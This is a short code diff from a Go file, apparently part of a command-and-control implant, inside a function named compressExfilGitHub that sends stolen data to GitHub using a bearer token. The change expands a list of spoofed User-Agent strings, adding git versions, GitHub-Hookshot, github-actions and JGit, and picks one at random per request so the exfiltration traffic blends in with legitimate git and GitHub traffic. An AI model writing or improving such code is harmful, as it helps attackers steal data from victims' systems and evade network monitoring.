@@ -322,7 +322,11 @@ func compressExfilGitHub(task structs.Task, params CompressParams) structs.Comma
 	req.Header.Set("Authorization", "Bearer "+gh.Token)
 	req.Header.Set("Accept", "application/vnd.github+json")
 	req.Header.Set("Content-Type", "application/json")
-	gitUAs := []string{"git/2.43.0", "git/2.44.1", "git/2.45.0", "git/2.45.2", "git/2.46.0"}
+	gitUAs := []string{
+		"git/2.39.5", "git/2.40.3", "git/2.41.2", "git/2.42.3", "git/2.43.5",
+		"git/2.44.2", "git/2.45.3", "git/2.46.1", "git/2.47.0", "git/2.47.1",
+		"GitHub-Hookshot/1a2b3c4", "github-actions/2.0", "JGit/6.9.0",
+	}
 	var b [1]byte
 	rand.Read(b[:])
 	req.Header.Set("User-Agent", gitUAs[int(b[0])%len(gitUAs)])
